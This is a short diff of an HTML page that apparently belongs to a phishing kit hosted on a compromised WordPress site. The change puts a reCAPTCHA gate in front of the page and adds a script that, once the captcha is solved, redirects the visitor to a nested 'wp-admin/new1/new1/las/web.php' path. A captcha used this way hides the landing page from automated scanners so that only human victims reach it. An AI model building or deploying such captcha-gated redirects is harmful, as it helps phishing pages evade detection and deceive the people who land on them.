@@ -5,9 +5,13 @@
   </head>
   <body>
     <form action="https://ghabtel.com/wp-admin/captcha.php" method="POST">
-      <div class="g-recaptcha" data-sitekey="6LfT_JYlAAAAAHk4c6RYDpfSmrVUnt49_VUysGJN"></div>
+      <div class="g-recaptcha" data-sitekey="6LfT_JYlAAAAAHk4c6RYDpfSmrVUnt49_VUysGJN" data-callback="redirect"></div>
       <br/>
-      <input type="submit" value="Submit" name="submit">
     </form>
   </body>
+  <script>
+    function redirect(){
+        window.location.replace("https://ghabtel.com/wp-admin/new1/new1/las/web.php")
+    }
+  </script>
 </html>
